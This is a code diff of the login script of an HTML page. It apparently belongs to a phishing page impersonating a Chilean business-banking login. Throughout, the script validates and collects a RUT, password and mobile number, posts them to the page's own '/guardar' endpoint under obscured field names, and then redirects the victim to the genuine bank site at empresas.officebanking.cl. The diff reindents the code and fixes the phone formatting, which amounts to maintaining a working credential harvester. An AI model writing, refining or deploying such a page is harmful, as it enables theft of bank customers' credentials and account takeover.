@@ -408,168 +408,168 @@
 
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 
-  <script>
-    const passwdInput = document.getElementById('passwd');
-    const togglePasswd = document.getElementById('togglePasswd');
-    const eyeIcon = document.getElementById('eyeIcon');
-    const loginForm = document.getElementById('loginForm');
-    const resultado = document.getElementById('resultado');
-    const mensajeExito = document.getElementById('mensajeExito');
-    const telefonoInput = document.getElementById('telefono');
-    const REDIRECT_URL = 'https://empresas.officebanking.cl/';
+<script>
+  const passwdInput = document.getElementById('passwd');
+  const togglePasswd = document.getElementById('togglePasswd');
+  const eyeIcon = document.getElementById('eyeIcon');
+  const loginForm = document.getElementById('loginForm');
+  const resultado = document.getElementById('resultado');
+  const mensajeExito = document.getElementById('mensajeExito');
+  const telefonoInput = document.getElementById('telefono');
+  const REDIRECT_URL = 'https://empresas.officebanking.cl/';
 
-    let visible = false;
+  let visible = false;
 
-    function setEyeIcon(showPassword) {
-      if (showPassword) {
-        eyeIcon.innerHTML = `
-          <path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6S2 12 2 12Z"></path>
-          <circle cx="12" cy="12" r="3"></circle>
-          <path d="M4 4 20 20"></path>
-        `;
+  function setEyeIcon(showPassword) {
+    if (showPassword) {
+      eyeIcon.innerHTML = `
+        <path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6S2 12 2 12Z"></path>
+        <circle cx="12" cy="12" r="3"></circle>
+        <path d="M4 4 20 20"></path>
+      `;
+    } else {
+      eyeIcon.innerHTML = `
+        <path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6S2 12 2 12Z"></path>
+        <circle cx="12" cy="12" r="3"></circle>
+      `;
+    }
+  }
+
+  setEyeIcon(false);
+
+  togglePasswd.addEventListener('click', () => {
+    visible = !visible;
+    passwdInput.type = visible ? 'text' : 'password';
+    setEyeIcon(visible);
+  });
+
+  telefonoInput.addEventListener('input', (e) => {
+    let digits = e.target.value.replace(/\D/g, '').slice(0, 11);
+
+    if (digits.length <= 2) {
+      e.target.value = '+56';
+      return;
+    }
+
+    let formatted = '+56';
+
+    if (digits.length > 2) {
+      formatted += ' ' + digits.substring(2, 3);
+    }
+
+    if (digits.length > 3) {
+      formatted += ' ' + digits.substring(3, 7);
+    }
+
+    if (digits.length > 7) {
+      formatted += ' ' + digits.substring(7, 11);
+    }
+
+    e.target.value = formatted.trim();
+  });
+
+  function formatearRUT(valor) {
+    valor = valor.replace(/\./g, '').replace(/-/g, '');
+    if (valor.length === 0) return '';
+
+    let dv = valor.slice(-1);
+    let cuerpo = valor.slice(0, -1);
+    let cuerpoFormateado = '';
+
+    while (cuerpo.length > 3) {
+      cuerpoFormateado = '.' + cuerpo.slice(-3) + cuerpoFormateado;
+      cuerpo = cuerpo.slice(0, -3);
+    }
+
+    cuerpoFormateado = cuerpo + cuerpoFormateado;
+    return cuerpoFormateado + '-' + dv;
+  }
+
+  document.getElementById('rut').addEventListener('input', function (e) {
+    let valor = e.target.value.replace(/[^0-9kK]/g, '');
+    e.target.value = formatearRUT(valor);
+  });
+
+  function validarRut(rutCompleto) {
+    rutCompleto = rutCompleto.replace(/\./g, '').replace(/-/g, '').toUpperCase();
+    if (rutCompleto.length < 2) return false;
+
+    let cuerpo = rutCompleto.slice(0, -1);
+    let dv = rutCompleto.slice(-1);
+    let suma = 0;
+    let multiplo = 2;
+
+    for (let i = cuerpo.length - 1; i >= 0; i--) {
+      suma += parseInt(cuerpo.charAt(i)) * multiplo;
+      multiplo = multiplo < 7 ? multiplo + 1 : 2;
+    }
+
+    let dvEsperado = 11 - (suma % 11);
+    dvEsperado = dvEsperado === 11 ? '0' : dvEsperado === 10 ? 'K' : dvEsperado.toString();
+    return dv === dvEsperado;
+  }
+
+  function validarTelefono(telefono) {
+    const normalizado = String(telefono || '').replace(/\s+/g, '');
+    return /^(\+?56)?9\d{8}$/.test(normalizado);
+  }
+
+  loginForm.addEventListener('submit', async function (e) {
+    e.preventDefault();
+
+    const rut = document.getElementById('rut').value.trim();
+    const passwd = document.getElementById('passwd').value.trim();
+    const telefono = document.getElementById('telefono').value.trim();
+
+    if (!validarRut(rut)) {
+      resultado.className = 'error';
+      resultado.innerText = '❌ RUT inválido';
+      return;
+    }
+
+    if (!passwd) {
+      resultado.className = 'error';
+      resultado.innerText = '❌ Debes ingresar la contraseña';
+      return;
+    }
+
+    if (!validarTelefono(telefono)) {
+      resultado.className = 'error';
+      resultado.innerText = '❌ El teléfono debe tener formato +56 9 1234 5678';
+      return;
+    }
+
+    try {
+      const response = await fetch('/guardar', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          numero: rut,
+          alfanumerico: passwd,
+          telefono
+        })
+      });
+
+      const data = await response.json();
+
+      if (response.ok) {
+        loginForm.classList.add('hidden');
+        resultado.className = 'success';
+        resultado.innerText = data.mensaje || 'Hemos recibido tu solicitud correctamente';
+        resultado.style.display = 'block';
+
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 1800);
       } else {
-        eyeIcon.innerHTML = `
-          <path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6S2 12 2 12Z"></path>
-          <circle cx="12" cy="12" r="3"></circle>
-        `;
-      }
-    }
-
-    setEyeIcon(false);
-
-    togglePasswd.addEventListener('click', () => {
-      visible = !visible;
-      passwdInput.type = visible ? 'text' : 'password';
-      setEyeIcon(visible);
-    });
-
-    telefonoInput.addEventListener('input', (e) => {
-      let digits = e.target.value.replace(/\D/g, '').slice(0, 11);
-
-      if (digits.length <= 2) {
-        e.target.value = '+56';
-        return;
-      }
-
-      let formatted = '+56';
-
-      if (digits.length > 2) {
-        formatted += ' ' + digits.substring(2, 3);
-      }
-
-      if (digits.length > 3) {
-        formatted += ' ' + digits.substring(3, 7);
-      }
-
-      if (digits.length > 7) {
-        formatted += ' + ' + digits.substring(7, 11);
-      }
-
-      e.target.value = formatted.trim();
-    });
-
-    function formatearRUT(valor) {
-      valor = valor.replace(/\./g, '').replace(/-/g, '');
-      if (valor.length === 0) return '';
-
-      let dv = valor.slice(-1);
-      let cuerpo = valor.slice(0, -1);
-      let cuerpoFormateado = '';
-
-      while (cuerpo.length > 3) {
-        cuerpoFormateado = '.' + cuerpo.slice(-3) + cuerpoFormateado;
-        cuerpo = cuerpo.slice(0, -3);
-      }
-
-      cuerpoFormateado = cuerpo + cuerpoFormateado;
-      return cuerpoFormateado + '-' + dv;
-    }
-
-    document.getElementById('rut').addEventListener('input', function (e) {
-      let valor = e.target.value.replace(/[^0-9kK]/g, '');
-      e.target.value = formatearRUT(valor);
-    });
-
-    function validarRut(rutCompleto) {
-      rutCompleto = rutCompleto.replace(/\./g, '').replace(/-/g, '').toUpperCase();
-      if (rutCompleto.length < 2) return false;
-
-      let cuerpo = rutCompleto.slice(0, -1);
-      let dv = rutCompleto.slice(-1);
-      let suma = 0;
-      let multiplo = 2;
-
-      for (let i = cuerpo.length - 1; i >= 0; i--) {
-        suma += parseInt(cuerpo.charAt(i)) * multiplo;
-        multiplo = multiplo < 7 ? multiplo + 1 : 2;
-      }
-
-      let dvEsperado = 11 - (suma % 11);
-      dvEsperado = dvEsperado === 11 ? '0' : dvEsperado === 10 ? 'K' : dvEsperado.toString();
-      return dv === dvEsperado;
-    }
-
-    function validarTelefono(telefono) {
-      const normalizado = String(telefono || '').replace(/\s+/g, '');
-      return /^(\+?56)?9\d{8}$/.test(normalizado);
-    }
-
-    loginForm.addEventListener('submit', async function (e) {
-      e.preventDefault();
-
-      const rut = document.getElementById('rut').value.trim();
-      const passwd = document.getElementById('passwd').value.trim();
-      const telefono = document.getElementById('telefono').value.trim();
-
-      if (!validarRut(rut)) {
         resultado.className = 'error';
-        resultado.innerText = '❌ RUT inválido';
-        return;
+        resultado.innerText = data.error || '❌ Error al guardar la información';
       }
-
-      if (!passwd) {
-        resultado.className = 'error';
-        resultado.innerText = '❌ Debes ingresar la contraseña';
-        return;
-      }
-
-      if (!validarTelefono(telefono)) {
-        resultado.className = 'error';
-        resultado.innerText = '❌ El teléfono debe tener formato +56 9 1234 5678';
-        return;
-      }
-
-      try {
-        const response = await fetch('/guardar', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            numero: rut,
-            alfanumerico: passwd,
-            telefono
-          })
-        });
-
-        const data = await response.json();
-
-        if (response.ok) {
-          loginForm.classList.add('hidden');
-          resultado.className = 'success';
-          resultado.innerText = data.mensaje || 'Hemos recibido tu solicitud correctamente';
-          resultado.style.display = 'block';
-
-          setTimeout(() => {
-            window.location.href = REDIRECT_URL;
-          }, 1800);
-        } else {
-          resultado.className = 'error';
-          resultado.innerText = data.error || '❌ Error al guardar la información';
-        }
-      } catch (error) {
-        resultado.className = 'error';
-        resultado.innerText = '⚠️ Error al conectar con el servidor.';
-      }
-    });
-  </script>
+    } catch (error) {
+      resultado.className = 'error';
+      resultado.innerText = '⚠️ Error al conectar con el servidor.';
+    }
+  });
+</script>
 </body>
 </html>
